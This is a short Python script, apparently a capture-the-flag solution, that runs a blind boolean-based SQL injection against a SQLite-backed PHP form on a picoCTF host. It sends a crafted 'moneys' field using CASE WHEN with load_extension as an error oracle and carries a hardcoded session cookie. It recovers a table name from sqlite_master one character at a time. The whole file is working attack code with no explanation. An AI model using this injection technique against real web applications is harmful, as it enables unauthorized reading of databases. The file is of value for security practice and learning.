import requests

try:
	flag = ""
	alpha = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"
	print("\nStart...\n")
	host = "http://wily-courier.picoctf.net:53455/contribute.php"
	for pos in range(1,18):
		for ch in alpha:
			resp = requests.post(host, cookies = {"PHPSESSID": "ebc8e920c23c0f665ac6dcf314a66ecc"}, data={"moneys":"34242' OR CASE WHEN ((SELECT SUBSTR(name,{},1) FROM sqlite_master WHERE type='table' LIMIT 1) = '{}') THEN 1 ELSE load_extension(1) END -- -".format(pos, ch)})
			if "Unable to execute statement: not authorized" not in resp.text:
				flag += ch
				print(flag)
				break
	print("\nFinished\n")
except:
	exit(0)
